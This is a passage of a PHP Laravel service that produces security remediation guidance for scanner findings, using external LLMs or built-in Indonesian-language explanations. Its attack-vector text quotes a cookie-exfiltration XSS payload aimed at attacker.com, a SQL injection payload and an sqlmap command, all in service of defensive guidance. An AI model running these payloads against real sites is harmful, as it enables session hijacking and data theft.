<?php

namespace App\Services;

use App\Models\Finding;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Str;

class AiRemediationService
{
    /**
     * Generate comprehensive AI remediation guidance for a security finding.
     */
    public function generateGuidance(Finding $finding): array
    {
        $finding->loadMissing(['project', 'scanJob', 'scanRun']);

        // Cache key based on finding ID and last updated timestamp
        $cacheKey = "ai_remediation_v2_{$finding->id}_" . ($finding->updated_at?->timestamp ?? 0);
        $cached = Cache::get($cacheKey);
        if ($cached && is_array($cached) && !empty($cached['summary'])) {
            return $cached;
        }

        $provider = config('secsys.ai.provider', env('AI_PROVIDER', 'auto'));
        $guidance = null;

        // Attempt live LLM generation if configured
        if ($provider !== 'heuristic') {
            try {
                $guidance = $this->tryGenerateLlmGuidance($finding, $provider);
            } catch (\Throwable $e) {
                Log::warning('LLM generation encountered an error, falling back to local cyber intelligence engine: ' . $e->getMessage(), [
                    'finding_id' => $finding->id,
                    'provider' => $provider,
                ]);
            }
        }

        // Fallback to advanced built-in Cyber Intelligence engine
        if (! $guidance) {
            $guidance = $this->generateAdvancedHeuristicGuidance($finding);
        }

        // Cache for 24 hours
        Cache::put($cacheKey, $guidance, 86400);

        return $guidance;
    }

    /**
     * Call external LLM provider (Google Gemini, OpenAI, DeepSeek, or Ollama).
     */
    private function tryGenerateLlmGuidance(Finding $finding, string $provider): ?array
    {
        $geminiKey = config('secsys.ai.gemini_api_key', env('GEMINI_API_KEY'));
        $openaiKey = config('secsys.ai.openai_api_key', env('OPENAI_API_KEY'));
        $deepseekKey = config('secsys.ai.deepseek_api_key', env('DEEPSEEK_API_KEY'));
        $ollamaHost = config('secsys.ai.ollama_host', env('OLLAMA_HOST'));

        // 1. Google Gemini
        if (($provider === 'gemini' || ($provider === 'auto' && $geminiKey)) && !empty($geminiKey)) {
            return $this->callGeminiApi($finding, $geminiKey);
        }

        // 2. OpenAI
        if (($provider === 'openai' || ($provider === 'auto' && $openaiKey)) && !empty($openaiKey)) {
            return $this->callOpenAiApi($finding, $openaiKey);
        }

        // 3. DeepSeek
        if (($provider === 'deepseek' || ($provider === 'auto' && $deepseekKey)) && !empty($deepseekKey)) {
            return $this->callDeepSeekApi($finding, $deepseekKey);
        }

        // 4. Ollama (Local LLM)
        if (($provider === 'ollama' || ($provider === 'auto' && $ollamaHost)) && !empty($ollamaHost)) {
            return $this->callOllamaApi($finding, $ollamaHost);
        }

        return null;
    }

    /**
     * Call Google Gemini API (gemini-1.5-flash / gemini-2.0-flash / gemini-1.5-pro)
     */
    private function callGeminiApi(Finding $finding, string $apiKey): ?array
    {
        $model = config('secsys.ai.gemini_model', env('GEMINI_MODEL', 'gemini-1.5-flash'));
        $url = "https://generativelanguage.googleapis.com/v1beta/models/{$model}:generateContent?key={$apiKey}";
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 15));

        $prompt = $this->buildLlmPrompt($finding);

        $payload = [
            'contents' => [
                [
                    'role' => 'user',
                    'parts' => [
                        ['text' => $prompt],
                    ],
                ],
            ],
            'generationConfig' => [
                'responseMimeType' => 'application/json',
                'temperature' => 0.2,
                'maxOutputTokens' => 2048,
            ],
        ];

        $response = Http::timeout($timeout)->post($url, $payload);

        if (! $response->successful()) {
            Log::warning('Gemini API request failed: ' . $response->status() . ' - ' . $response->body());
            return null;
        }

        $json = $response->json();
        $rawText = data_get($json, 'candidates.0.content.parts.0.text');

        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "Google Gemini (" . strtoupper(str_replace('gemini-', '', $model)) . ")", 'gemini');
    }

    /**
     * Call OpenAI API (gpt-4o / gpt-4o-mini / gpt-3.5-turbo)
     */
    private function callOpenAiApi(Finding $finding, string $apiKey): ?array
    {
        $model = config('secsys.ai.openai_model', env('OPENAI_MODEL', 'gpt-4o-mini'));
        $url = 'https://api.openai.com/v1/chat/completions';
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 15));

        $prompt = $this->buildLlmPrompt($finding);

        $response = Http::withToken($apiKey)
            ->timeout($timeout)
            ->post($url, [
                'model' => $model,
                'messages' => [
                    [
                        'role' => 'system',
                        'content' => 'You are an expert Application Security and DevSecOps specialist. Respond in valid JSON only with deep, concrete cybersecurity analysis.',
                    ],
                    [
                        'role' => 'user',
                        'content' => $prompt,
                    ],
                ],
                'response_format' => ['type' => 'json_object'],
                'temperature' => 0.2,
            ]);

        if (! $response->successful()) {
            Log::warning('OpenAI API request failed: ' . $response->status() . ' - ' . $response->body());
            return null;
        }

        $rawText = data_get($response->json(), 'choices.0.message.content');
        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "OpenAI " . strtoupper($model), 'openai');
    }

    /**
     * Call DeepSeek API
     */
    private function callDeepSeekApi(Finding $finding, string $apiKey): ?array
    {
        $model = config('secsys.ai.deepseek_model', env('DEEPSEEK_MODEL', 'deepseek-chat'));
        $url = 'https://api.deepseek.com/chat/completions';
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 15));

        $prompt = $this->buildLlmPrompt($finding);

        $response = Http::withToken($apiKey)
            ->timeout($timeout)
            ->post($url, [
                'model' => $model,
                'messages' => [
                    [
                        'role' => 'system',
                        'content' => 'You are a senior Application Security and DevSecOps engineer. Output valid JSON only.',
                    ],
                    [
                        'role' => 'user',
                        'content' => $prompt,
                    ],
                ],
                'response_format' => ['type' => 'json_object'],
                'temperature' => 0.2,
            ]);

        if (! $response->successful()) {
            return null;
        }

        $rawText = data_get($response->json(), 'choices.0.message.content');
        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "DeepSeek Intelligence", 'deepseek');
    }

    /**
     * Call Ollama local model API
     */
    private function callOllamaApi(Finding $finding, string $host): ?array
    {
        $model = config('secsys.ai.ollama_model', env('OLLAMA_MODEL', 'llama3'));
        $url = rtrim($host, '/') . '/api/generate';
        $timeout = (int) config('secsys.ai.timeout_seconds', env('AI_TIMEOUT_SECONDS', 20));

        $prompt = $this->buildLlmPrompt($finding) . "\n\nCRITICAL: Respond ONLY with a valid JSON object matching the requested schema. Do not enclose in markdown blocks.";

        $response = Http::timeout($timeout)->post($url, [
            'model' => $model,
            'prompt' => $prompt,
            'format' => 'json',
            'stream' => false,
        ]);

        if (! $response->successful()) {
            return null;
        }

        $rawText = $response->json('response');
        if (! $rawText) {
            return null;
        }

        $parsed = json_decode($rawText, true);
        if (! is_array($parsed) || empty($parsed['summary'])) {
            return null;
        }

        return $this->formatLlmResult($finding, $parsed, "Ollama Local AI ({$model})", 'ollama');
    }

    /**
     * Build standard prompt for the LLM.
     */
    private function buildLlmPrompt(Finding $finding): string
    {
        $projectName = $finding->project?->name ?? 'Aplikasi Web';
        $engine = $finding->engine_key ?? 'Security Scanner';
        $filePath = $finding->file_path ?? ($finding->endpoint ?? 'Web Server Configuration');
        $lineInfo = $finding->line_start ? "Baris {$finding->line_start}" . ($finding->line_end ? "-{$finding->line_end}" : "") : 'Header HTTP / Konfigurasi Global';
        $evidence = !empty($finding->evidence_summary) ? json_encode($finding->evidence_summary, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES) : 'Tidak ada potongan bukti langsung.';

        return <<<PROMPT
Anda adalah AI Spesialis Keamanan Siber Aplikasi (Senior DevSecOps & Certified Penetration Tester) tingkat dunia untuk platform TAMENG.
Berikan analisis kerentanan dan rekomendasi perbaikan kode (remediation patch) yang mendalam, presisi, canggih, dan dapat langsung dieksekusi oleh developer.

KONTEKS TEMUAN:
- Judul Temuan: {$finding->title}
- Scanner Engine: {$engine}
- Aturan / Rule ID: {$finding->rule_id}
- Tingkat Keparahan: {$finding->severity}
- Project Target: {$projectName}
- Lokasi Berkas / Endpoint: {$filePath}
- Baris Kode: {$lineInfo}
- CWE: {$finding->cwe}
- OWASP: {$finding->owasp}
- CVSS: {$finding->cvss}
- Bukti Kerentanan / Evidence:
{$evidence}

INSTRUKSI:
Kembalikan respon HANYA dalam format JSON valid (Bahasa Indonesia teknis yang formal dan profesional) dengan skema berikut:
{
  "category": "Nama kategori kerentanan yang spesifik (misal: Cross-Site Scripting, Missing Security Headers, SQL Injection)",
  "summary": "Penjelasan mendalam dan teknis mengapa celah ini terjadi pada konteks berkas/konfigurasi ini (2-3 kalimat)",
  "cause": "Akar masalah teknis utama dari kerentanan ini",
  "attack_vector": "Skenario nyata bagaimana penyerang (attacker) dapat mengeksploitasi celah ini langkah-demi-langkah beserta contoh payload",
  "business_impact": "Dampak terhadap bisnis, data sensitif, reputasi, atau kepatuhan regulasi (misal UU PDP / ISO 27001 / PCI-DSS)",
  "vulnerable_code": "Snippet kode atau konfigurasi yang rentan",
  "secure_code": "Snippet kode perbaikan yang aman dan siap diimplementasikan",
  "code_diff": "Perbandingan jelas kode sebelum dan sesudah perbaikan (bisa format unified diff atau format SEBELUM vs SESUDAH)",
  "mitigation_checklist": [
    "Langkah perbaikan 1 yang spesifik",
    "Langkah perbaikan 2",
    "Langkah perbaikan 3",
    "Langkah perbaikan 4"
  ],
  "verification_command": "Perintah CLI atau metode testing untuk memverifikasi perbaikan (contoh: perintah curl, npm audit, atau unit test)",
  "defense_in_depth": "Rekomendasi arsitektur keamanan berlapis tambahan untuk mencegah celah serupa"
}
PROMPT;
    }

    /**
     * Format LLM API result into standard TAMENG AI response structure.
     */
    private function formatLlmResult(Finding $finding, array $parsed, string $modelName, string $badgeType): array
    {
        $codeDiff = $parsed['code_diff'] ?? null;
        if (! $codeDiff && (!empty($parsed['vulnerable_code']) || !empty($parsed['secure_code']))) {
            $codeDiff = "--- KONDISI RENTAN:\n" . ($parsed['vulnerable_code'] ?? '') . "\n\n+++ SOLUSI PERBAIKAN AMAN:\n" . ($parsed['secure_code'] ?? '');
        }

        return [
            'finding_id' => $finding->id,
            'finding_code' => $finding->code,
            'rule_id' => $finding->rule_id,
            'title' => $finding->title,
            'severity' => $finding->severity,
            'category' => $parsed['category'] ?? ($finding->title ?: 'Security Vulnerability'),
            'summary' => $parsed['summary'] ?? '',
            'cause' => $parsed['cause'] ?? null,
            'attack_vector' => $parsed['attack_vector'] ?? '',
            'business_impact' => $parsed['business_impact'] ?? '',
            'code_diff' => $codeDiff,
            'vulnerable_code' => $parsed['vulnerable_code'] ?? null,
            'secure_code' => $parsed['secure_code'] ?? null,
            'mitigation_checklist' => is_array($parsed['mitigation_checklist'] ?? null) ? $parsed['mitigation_checklist'] : [],
            'verification_command' => $parsed['verification_command'] ?? null,
            'compliance' => [
                'cwe' => $finding->cwe ?: ($parsed['cwe'] ?? 'CWE-699: Software Development Concepts'),
                'owasp' => $finding->owasp ?: ($parsed['owasp'] ?? 'OWASP Top 10'),
                'cvss_score' => $finding->cvss ?? $this->defaultCvss($finding->severity),
            ],
            'owasp_guidance' => [
                'top_10_category' => $finding->owasp ?: 'OWASP Top 10 Application Security Risks',
                'defense_in_depth' => $parsed['defense_in_depth'] ?? 'Terapkan validasi input ketat, otorisasi berlapis (RBAC), dan enkripsi transmisi data.',
                'verification_method' => $parsed['verification_command'] ?? 'Jalankan ulang pemindaian TAMENG untuk memvalidasi perbaikan.',
            ],
            'ai_model' => $modelName,
            'ai_badge' => $badgeType,
            'is_live_llm' => true,
            'disclaimer' => "TAMENG {$modelName}: Analisis keamanan berbasis AI canggih. Selalu verifikasi dan lakukan regression testing pada lingkungan staging sebelum menerapkan patch ke production.",
        ];
    }

    /**
     * High-grade built-in Cyber Intelligence engine when live LLM is unconfigured or offline.
     */
    private function generateAdvancedHeuristicGuidance(Finding $finding): array
    {
        $category = $this->categorizeFinding($finding);
        $fileExt = strtolower(pathinfo($finding->file_path ?? '', PATHINFO_EXTENSION) ?: 'php');

        $explanation = $this->buildExplanation($finding, $category);
        $patchData = $this->buildCodePatch($finding, $category, $fileExt);
        $mitigations = $this->buildMitigationSteps($finding, $category);
        $owaspGuidance = $this->buildOwaspGuidance($finding);

        // Format code_diff nicely as unified diff or side-by-side string if it's an array
        $diffString = '';
        if (is_array($patchData)) {
            $filePath = $patchData['file_path'] ?? 'Berkas Terkait';
            $diffString = "--- SEBELUM [{$filePath}] (Kondisi Rentan):\n" . ($patchData['vulnerable_code'] ?? '') . "\n\n+++ SESUDAH (Solusi Perbaikan Direkomendasikan):\n" . ($patchData['secure_code'] ?? '');
        } else {
            $diffString = (string) $patchData;
        }

        return [
            'finding_id' => $finding->id,
            'finding_code' => $finding->code,
            'rule_id' => $finding->rule_id,
            'title' => $finding->title,
            'severity' => $finding->severity,
            'category' => $category['name'],
            'summary' => $explanation['summary'],
            'cause' => $explanation['cause'] ?? null,
            'attack_vector' => $explanation['attack_vector'],
            'business_impact' => $explanation['impact'],
            'code_diff' => $diffString,
            'vulnerable_code' => $patchData['vulnerable_code'] ?? null,
            'secure_code' => $patchData['secure_code'] ?? null,
            'mitigation_checklist' => $mitigations,
            'verification_command' => $explanation['verification'] ?? null,
            'compliance' => [
                'cwe' => $finding->cwe ?: $category['cwe'],
                'owasp' => $finding->owasp ?: $category['owasp'],
                'cvss_score' => $finding->cvss ?? $this->defaultCvss($finding->severity),
            ],
            'owasp_guidance' => $owaspGuidance,
            'ai_model' => 'TAMENG Cyber Intelligence Engine v2.5 (Expert Heuristic)',
            'ai_badge' => 'tameng-ai',
            'is_live_llm' => false,
            'disclaimer' => 'TAMENG Cyber Intelligence: Analisis keamanan otomatis berstandar OWASP & CIS Benchmarks. Selalu tinjau arsitektur aplikasi dan jalankan testing sebelum deploy ke production.',
        ];
    }

    private function categorizeFinding(Finding $finding): array
    {
        $rule = strtolower($finding->rule_id ?? '');
        $title = strtolower($finding->title ?? '');

        // 1. Clickjacking
        if (Str::contains($rule, ['clickjacking', 'x-frame-options', '10020']) || Str::contains($title, ['clickjacking', 'x-frame-options', 'anti-clickjacking'])) {
            return [
                'type' => 'clickjacking',
                'name' => 'Missing Anti-Clickjacking Header (X-Frame-Options)',
                'cwe' => 'CWE-1021: Improper Restriction of Rendered UI Layers or Frames',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 2. CSP (Content Security Policy)
        if (Str::contains($rule, ['content-security-policy', 'csp', '10038', '10055']) || Str::contains($title, ['content security policy', 'csp header'])) {
            return [
                'type' => 'csp_missing',
                'name' => 'Content Security Policy (CSP) Not Configured',
                'cwe' => 'CWE-358: Improperly Implemented Security Check for Standard',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 3. X-Content-Type-Options
        if (Str::contains($rule, ['x-content-type-options', 'nosniff', '10021']) || Str::contains($title, ['x-content-type-options', 'nosniff'])) {
            return [
                'type' => 'x_content_type_options',
                'name' => 'Missing X-Content-Type-Options Header (MIME-Sniffing)',
                'cwe' => 'CWE-693: Protection Mechanism Failure',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 4. HSTS (Strict-Transport-Security)
        if (Str::contains($rule, ['strict-transport-security', 'hsts', '10035']) || Str::contains($title, ['strict-transport-security', 'hsts'])) {
            return [
                'type' => 'hsts_missing',
                'name' => 'Missing HTTP Strict Transport Security (HSTS)',
                'cwe' => 'CWE-319: Cleartext Transmission of Sensitive Information',
                'owasp' => 'A02:2021-Cryptographic Failures',
            ];
        }

        // 5. Permissions-Policy
        if (Str::contains($rule, ['permissions-policy', 'feature-policy', '10063']) || Str::contains($title, ['permissions policy', 'feature policy'])) {
            return [
                'type' => 'permissions_policy',
                'name' => 'Missing Permissions-Policy Header',
                'cwe' => 'CWE-693: Protection Mechanism Failure',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 6. COEP / COOP (Cross-Origin Policies)
        if (Str::contains($rule, ['cross-origin-embedder', 'cross-origin-opener', 'coep', 'coop', '90004', '90005']) || Str::contains($title, ['cross-origin-embedder', 'cross-origin-opener', 'coep'])) {
            return [
                'type' => 'coep_coop',
                'name' => 'Missing Cross-Origin Isolation Headers (COEP/COOP)',
                'cwe' => 'CWE-693: Protection Mechanism Failure',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        // 7. SSL / TLS / Cipher Weaknesses
        if (Str::contains($rule, ['weak-cipher', 'deprecated-tls', 'tls-version', 'ssl-issuer', 'wildcard-tls', 'ssl-dns-names', 'testssl', 'cipher']) || Str::contains($title, ['cipher', 'tls', 'ssl'])) {
            return [
                'type' => 'weak_ssl_ciphers',
                'name' => 'TLS/SSL Cryptographic Configuration & Cipher Suites',
                'cwe' => 'CWE-326: Inadequate Encryption Strength',
                'owasp' => 'A02:2021-Cryptographic Failures',
            ];
        }

        // 8. Cache-Control & Storable Content
        if (Str::contains($rule, ['cache-control', 'storable', 'cacheable', '10015', '10049', '10050']) || Str::contains($title, ['cache-control', 'cacheable', 'cache'])) {
            return [
                'type' => 'cache_control',
                'name' => 'HTTP Cache-Control Directives & Sensitive Data Caching',
                'cwe' => 'CWE-524: Use of Cache Containing Sensitive Information',
                'owasp' => 'A01:2021-Broken Access Control',
            ];
        }

        // 9. Secrets / Credentials
        if (Str::contains($rule, ['secret', 'gitleaks', 'key', 'token', 'password', 'credential', 'auth-token']) || Str::contains($title, ['secret', 'token', 'credential', 'api key', 'password'])) {
            return [
                'type' => 'secret_leak',
                'name' => 'Hardcoded Secrets & Credential Exposure',
                'cwe' => 'CWE-798: Use of Hard-coded Credentials',
                'owasp' => 'A07:2021-Identification and Authentication Failures',
            ];
        }

        // 10. SQL Injection
        if (Str::contains($rule, ['sql', 'sqli', 'injection']) || Str::contains($title, ['sql injection', 'sqli', 'raw query'])) {
            return [
                'type' => 'sql_injection',
                'name' => 'SQL Injection (SQLi) Vulnerability',
                'cwe' => 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
                'owasp' => 'A03:2021-Injection',
            ];
        }

        // 11. XSS
        if (Str::contains($rule, ['xss', 'cross-site-scripting', 'dangerouslysetinnerhtml', 'unescaped']) || Str::contains($title, ['cross-site scripting', 'xss'])) {
            return [
                'type' => 'xss',
                'name' => 'Cross-Site Scripting (XSS)',
                'cwe' => 'CWE-79: Improper Neutralization of Input During Web Page Generation',
                'owasp' => 'A03:2021-Injection',
            ];
        }

        // 12. Subresource Integrity (SRI)
        if (Str::contains($rule, ['integrity', 'sri', 'subresource']) || Str::contains($title, ['subresource integrity', 'integrity attribute'])) {
            return [
                'type' => 'sri_missing',
                'name' => 'Subresource Integrity (SRI) Attribute Missing',
                'cwe' => 'CWE-353: Missing Support for Integrity Check',
                'owasp' => 'A08:2021-Software and Data Integrity Failures',
            ];
        }

        // 13. RCE / Command Injection
        if (Str::contains($rule, ['rce', 'eval', 'exec', 'command-injection', 'unserialize', 'system']) || Str::contains($title, ['remote code execution', 'command injection', 'code execution'])) {
            return [
                'type' => 'rce',
                'name' => 'Remote Code Execution / OS Command Injection',
                'cwe' => 'CWE-78: Improper Neutralization of Special Elements used in an OS Command',
                'owasp' => 'A03:2021-Injection',
            ];
        }

        // 14. Vulnerable Dependency (SCA)
        if (Str::contains($rule, ['cve', 'trivy', 'osv', 'package', 'dependency', 'vulnerable-dependency']) || Str::contains($title, ['vulnerable dependency', 'outdated', 'cve-'])) {
            return [
                'type' => 'vulnerable_dependency',
                'name' => 'Vulnerable Third-Party Component (CVE)',
                'cwe' => 'CWE-1395: Dependency on Vulnerable Third-Party Component',
                'owasp' => 'A06:2021-Vulnerable and Outdated Components',
            ];
        }

        // 15. Server Misconfiguration (Nikto / Generic)
        if (Str::contains($rule, ['nikto', 'misconfig', 'cors', 'csrf', 'security-header', 'cookie', 'helmet']) || Str::contains($title, ['nikto', 'cors', 'csrf', 'header', 'cookie', 'server'])) {
            return [
                'type' => 'misconfig',
                'name' => 'Web Server Security Misconfiguration',
                'cwe' => 'CWE-16: Configuration Errors',
                'owasp' => 'A05:2021-Security Misconfiguration',
            ];
        }

        return [
            'type' => 'generic',
            'name' => 'Security Weakness / Code Quality Issue',
            'cwe' => 'CWE-699: Software Development Concepts',
            'owasp' => 'A04:2021-Insecure Design',
        ];
    }

    private function buildExplanation(Finding $finding, array $category): array
    {
        return match ($category['type']) {
            'clickjacking' => [
                'summary' => 'Server web belum mengonfigurasi header respon anti-framing (X-Frame-Options atau CSP frame-ancestors). Kondisi ini mengizinkan halaman aplikasi dimuat di dalam iframe situs eksternal yang dikendalikan pihak lain.',
                'cause' => 'Web server Nginx/Apache atau middleware HTTP framework aplikasi belum mengirimkan instruksi pembatasan rendering frame pada setiap respon HTTP.',
                'attack_vector' => "1. Penyerang membuat website jebakan (e.g. evil-portal.com).\n2. Halaman aplikasi Anda disematkan ke dalam <iframe> transparan dengan opacity: 0 tepat di atas tombol menggiurkan (misal tombol 'Klaim Hadiah').\n3. Saat korban mengklik tombol palsu, browser mengeksekusi klik pada tombol asli aplikasi Anda (seperti 'Hapus Akun' atau 'Transfer Dana').",
                'impact' => 'Pembajakan aksi pengguna (Clickjacking/UI Redressing), manipulasi transaksi tanpa disadari, pengubahan kredensial, dan pencurian otorisasi.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "X-Frame-Options"',
            ],
            'csp_missing' => [
                'summary' => 'Header Content-Security-Policy (CSP) tidak ditemukan pada respon HTTP. Browser klien tidak memiliki batasan sumber eksekusi script, stylesheet, koneksi WebSocket, maupun objek media eksternal.',
                'cause' => 'Tidak adanya deklarasi kebijakan CSP pada level reverse-proxy atau application middleware untuk mengontrol asal (origins) sumber daya yang boleh dieksekusi.',
                'attack_vector' => "1. Penyerang menyuntikkan payload JavaScript jahat via celah input atau third-party CDN yang disusupi.\n2. Tanpa CSP, browser langsung mengeksekusi skrip tersebut dan mengirimkan session cookies/JWT ke server penyerang (exfiltration).",
                'impact' => 'Eksekusi Cross-Site Scripting (XSS) skala penuh, pembajakan token sesi, data tampering, dan defacement antarmuka web.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Content-Security-Policy"',
            ],
            'x_content_type_options' => [
                'summary' => 'Header X-Content-Type-Options: nosniff tidak dikirimkan oleh server. Browser klien berpotensi mengabaikan tipe MIME resmi dan menebak tipe konten melalui teknik MIME-sniffing.',
                'cause' => 'Web server belum memblokir perilaku bawaan browser lama yang mencoba mengeksekusi konten non-script (seperti gambar .jpg atau file .txt) sebagai JavaScript.',
                'attack_vector' => "1. Penyerang mengunggah file gambar profil yang disisipi kode JavaScript di dalamnya (Polyglot file).\n2. Saat diakses via browser korban, browser melakukan MIME-sniffing dan mengeksekusi kode script tersebut seolah-olah file JavaScript resmi.",
                'impact' => 'Bypass filter upload berkas dan eksekusi skrip tak sah pada domain aplikasi.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "X-Content-Type-Options"',
            ],
            'hsts_missing' => [
                'summary' => 'Header Strict-Transport-Security (HSTS) belum diaktifkan pada server HTTPS. Browser tidak dipaksa untuk selalu menggunakan koneksi terenkripsi.',
                'cause' => 'Konfigurasi SSL/TLS pada Nginx/Apache belum menyertakan direktif max-age dan includeSubDomains pada header Strict-Transport-Security.',
                'attack_vector' => "1. Pengguna terhubung ke Wi-Fi publik (kafe/bandara).\n2. Penyerang di jaringan yang sama melakukan serangan ARP spoofing dan SSL Stripping (mengarahkan akses pertama korban dari HTTPS ke HTTP biasa tanpa enkripsi).\n3. Semua kredensial dan data form korban disadap dalam bentuk teks polos.",
                'impact' => 'Penyadapan lalu lintas data sensitif, pencurian password akun, dan pembajakan sesi komunikasi klien-server.',
                'verification' => 'curl -s -D- https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Strict-Transport-Security"',
            ],
            'permissions_policy' => [
                'summary' => 'Header Permissions-Policy belum diatur. Fitur perangkat keras browser klien (kamera, mikrofon, lokasi GPS, sensor akselerometer) tidak dibatasi secara eksplisit.',
                'cause' => 'Tidak adanya batasan izin kapabilitas browser modern untuk dokumen utama maupun iframe pihak ketiga.',
                'attack_vector' => "1. Skrip pihak ketiga (analytics/ads widget) atau iframe yang disusupi mencoba mengakses API navigator.mediaDevices atau geolocation secara diam-diam.\n2. Tanpa Permissions-Policy, pembatasan akses hanya bergantung pada pop-up izin browser yang rentan terhadap rekayasa sosial.",
                'impact' => 'Pelanggaran privasi data pribadi pengguna (UU PDP), potensi pelacakan lokasi fisik tanpa izin.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Permissions-Policy"',
            ],
            'coep_coop' => [
                'summary' => 'Header isolasi lingkungan Cross-Origin (COEP / COOP) belum disetel. Dokumen aplikasi tidak terisolasi dari window/tab lain yang dibuka oleh browser.',
                'cause' => 'Web server belum menyertakan Cross-Origin-Embedder-Policy dan Cross-Origin-Opener-Policy pada respon HTTP.',
                'attack_vector' => "1. Penyerang membuat halaman web jebakan yang membuka tab ke aplikasi Anda (window.open).\n2. Dengan memanipulasi referensi window dan memanfaatkan serangan side-channel memori browser (seperti Spectre), penyerang dapat membaca potongan data sensitif dari memori proses browser.",
                'impact' => 'Kebocoran data rahasia lintas konteks tab browser dan penurunan derajat isolasi komputasi klien.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Cross-Origin"',
            ],
            'weak_ssl_ciphers' => [
                'summary' => 'Audit SSL/TLS menemukan penggunaan cipher suite usang, algoritma hashing lemah (e.g. SHA-1/MD5), atau dukungan versi protokol TLS lawas (TLS 1.0 / 1.1).',
                'cause' => 'Konfigurasi SSL pada web server mengizinkan cipher CBC mode atau algoritma enkripsi RC4/3DES demi kompatibilitas klien sangat tua.',
                'attack_vector' => "1. Penyerang merekam lalu lintas jaringan terenkripsi (traffic capture).\n2. Penyerang memanfaatkan kelemahan matematis cipher lama (misal POODLE, BEAST, SWEET32) untuk mendekripsi paket data sesi pengguna.",
                'impact' => 'Dekripsi data transaksi finansial, kebocoran kredensial, serta kegagalan audit kepatuhan PCI-DSS / ISO 27001.',
                'verification' => 'openssl s_client -connect ' . ($finding->endpoint ?: 'example.com:443') . ' -tls1_1',
            ],
            'cache_control' => [
                'summary' => 'Halaman yang memuat informasi sensitif atau data akun pengguna disimpan di cache browser lokal tanpa proteksi no-store / no-cache.',
                'cause' => 'Aplikasi web atau web server tidak mengirimkan header respon Cache-Control: no-store pada rute terautentikasi.',
                'attack_vector' => "1. Pengguna login dan mengakses data profil/transaksi pada komputer publik (kantor/warnet) lalu logout.\n2. Pengguna berikutnya menekan tombol 'Back' (Kembali) pada browser.\n3. Halaman yang memuat data sensitif pengguna sebelumnya ditampilkan kembali secara utuh dari cache disk browser.",
                'impact' => 'Kebocoran Data Pribadi (PII), nomor identitas, riwayat transaksi finansial, dan token otentikasi.',
                'verification' => 'curl -I https://' . ($finding->endpoint ?: 'example.com') . ' | grep -i "Cache-Control"',
            ],
            'secret_leak' => [
                'summary' => 'Ditemukan token autentikasi rahasia, API Key, private key, atau password basis data yang tertulis secara langsung (hardcoded) di dalam repositori kode.',
                'cause' => 'Kredensial produksi dimasukkan langsung ke kode sumber tanpa melalui environment variables (.env) atau sistem Secret Vault.',
                'attack_vector' => "1. Penyerang mendapatkan akses baca ke repositori kode (melalui kebocoran git, CI/CD logs, atau akses developer).\n2. Penyerang mengekstrak token rahasia dan menggunakannya langsung untuk mengakses database produksi, cloud API, atau akun layanan eksternal.",
                'impact' => 'Akses penuh ke infrastruktur cloud, kebocoran data massal (data breach), tagihan API membengkak, dan pengambilalihan sistem secara permanen.',
                'verification' => 'git log -S "' . substr($finding->title ?? 'secret', 0, 15) . '" --source --all',
            ],
            'sql_injection' => [
                'summary' => 'Input pengguna digabungkan langsung ke dalam kueri database tanpa proses parameter binding atau sanitasi query ORM yang aman.',
                'cause' => 'Penggunaan konkatenasi string secara langsung pada perintah SQL (seperti raw query DB::raw atau query konkatenasi PHP).',
                'attack_vector' => "1. Penyerang mengirimkan payload SQL pada input field (contoh: ' OR '1'='1' --).\n2. Kueri database termodifikasi sehingga mengabaikan logika autentikasi atau mengeksekusi UNION SELECT untuk menyedot seluruh isi tabel database.",
                'impact' => 'Pencurian seluruh isi database (username, password hash, data pelanggan), manipulasi data saldo/transaksi, dan potensi Remote Code Execution via xp_cmdshell / INTO OUTFILE.',
                'verification' => "sqlmap -u 'https://" . ($finding->endpoint ?: 'example.com') . "?id=1' --batch",
            ],
            'xss' => [
                'summary' => 'Data input pengguna yang tidak disanitasi dirender langsung ke dalam dokumen HTML/DOM tanpa contextual escaping.',
                'cause' => 'Penggunaan method render mentah (seperti v-html di Vue, dangerouslySetInnerHTML di React, atau {!! !!} di Blade) pada input pengguna.',
                'attack_vector' => "1. Penyerang menyisipkan payload seperti <script>fetch('https://attacker.com/steal?c='+document.cookie)</script> pada kolom komentar atau parameter URL.\n2. Saat halaman dibuka oleh pengguna lain (termasuk admin), skrip dieksekusi di browser korban dan mengirimkan session cookie ke penyerang.",
                'impact' => 'Pencurian session cookie/token JWT akun, pembajakan akun administrator, manipulasi tampilan web (defacement), dan phishing interaktif.',
                'verification' => 'Periksa apakah output di-escape menggunakan fungsi bawaan template engine atau DOMPurify.',
            ],
            'sri_missing' => [
                'summary' => 'Tag skrip atau stylesheet memuat aset dari jaringan CDN publik pihak ketiga tanpa menyertakan atribut Subresource Integrity (SRI) hash.',
                'cause' => 'Penggunaan tag <script src="https://cdn..."> tanpa atribut integrity="..." dan crossorigin="anonymous".',
